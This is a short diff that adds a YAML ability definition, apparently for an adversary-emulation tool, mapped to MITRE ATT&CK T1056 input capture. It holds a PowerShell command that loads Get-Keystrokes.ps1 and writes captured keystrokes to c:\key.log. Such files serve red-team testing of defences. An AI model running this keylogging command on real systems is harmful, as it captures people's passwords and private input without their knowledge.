@@ -1,0 +1,17 @@
+---
+
+- id: 1345bff7-6f26-43b2-a92a-9aabccdbT1056
+  name: input capture
+  description: test
+  tactic: credential-access
+  technique:
+    attack_id: T1056
+    name: input capture
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Get-Keystrokes.ps1 -Verbose -Force;
+          Get-Keystrokes.ps1 -LogPath c:\key.log;
+        payload: Get-Keystrokes.ps1
+
